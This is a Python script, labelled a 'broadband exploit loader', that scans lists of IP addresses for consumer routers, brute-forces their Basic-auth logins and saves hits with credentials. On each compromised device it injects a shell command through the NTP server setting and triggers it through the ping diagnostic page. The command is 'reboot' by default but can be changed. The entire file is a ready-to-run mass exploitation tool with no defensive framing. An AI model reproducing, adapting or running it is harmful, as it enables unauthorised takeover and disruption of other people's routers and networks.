# broadband exploit loader written by hubnr
import sys
import base64
import requests
from threading import Thread

totalFound = 0
ips = []
logins = []
payload = 'reboot'
execTrigger = ';ps|sh'

def getLogins(filename):
    with open(filename, 'r') as file:
        for line in file:
            line = line.replace('\n', '')
            logins.append(line)


def getIps(filename):
    with open(filename, 'r') as file:
        for line in file:
            line = line.replace('\n', '')
            ips.append(line)

def getSession(ip, port, auth):
    r = requests.get(f'http://{ip}:{port}/sntpcfg.html', headers={'Authorization': f'Basic {auth}'})
    r = r.text
    session = r.split('sessionKey=\'')[1].split('\';')[0]
    return session

def exploit(ip, port, auth):
    global payload
    global execTrigger
    try:
        session = getSession(ip, port, auth)
        r = requests.get(f'http://{ip}:{port}/sntpcfg.cgi?ntp_enabled=1&ntpServer1={payload}&ntpServer2=&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0&sessionKey={session}', headers={'Authorization': f'Basic {auth}'})
        session = getSession(ip, port, auth)
        r = requests.get(f'http://{ip}:{port}/pingHost.cmd?action=add&targetHostAddress={execTrigger}&sessionKey={session}', headers={'Authorization': f'Basic {auth}'})
        session = getSession(ip, port, auth)
        r = requests.get(f'http://{ip}:{port}/sntpcfg.cgi?ntp_enabled=1&ntpServer1=time.nist.gov&ntpServer2=&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0&sessionKey={session}', headers={'Authorization': f'Basic {auth}'})
        return session
    except Exception as e:
        print(e)

def bruteDev(ip, port):
    global totalFound
    try:
        for login in logins:
            auth = base64.b64encode(str.encode(login)).decode()
            headers = {
            'Authorization': f'Basic {auth}'
            }
            r = requests.get(f'http://{ip}:{port}/', headers=headers)
            if r.status_code == 200:
                totalFound += 1
                print(f'Found [{totalFound}]: {ip}')
                Thread(target=exploit, args=(ip,port,auth,)).start()
                with open('found.txt', 'a+') as file:
                    file.write(f'{ip}:{port} ({base64.b64decode(str.encode(auth)).decode()})\n')
                return auth
        return "no"
    except:
        return "no"

def verifyDev(ip, port):
    global totalFound
    try:
        r = requests.get(f'http://{ip}:{port}/')
        if r.status_code != 401:
            pass
        elif r.headers['WWW-Authenticate'] != "Basic realm=\"Broadband Router\"":
            pass
        else:
            totalFound += 1
            bruteDev(ip, port)
    except:
        pass

if __name__ == '__main__':
    # init
    getLogins("logins.txt")
    getIps(sys.argv[1])
    port = int(sys.argv[2])
    for ip in ips:
        Thread(target=verifyDev, args=(ip,port,)).start()
    print('done reading list')